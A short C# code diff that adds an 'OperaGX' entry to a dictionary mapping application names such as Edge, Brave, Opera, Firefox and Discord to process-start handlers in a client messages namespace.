@@ -275,6 +275,7 @@ namespace Pulsar.Client.Messages
                 { "Edge", ProcessHandler.StartEdge },
                 { "Brave", ProcessHandler.StartBrave },
                 { "Opera", ProcessHandler.StartOpera },
+                { "OperaGX", ProcessHandler.StartOperaGX },
                 { "Mozilla", ProcessHandler.StartFirefox },
                 { "Discord", ProcessHandler.StartDiscord }
             };
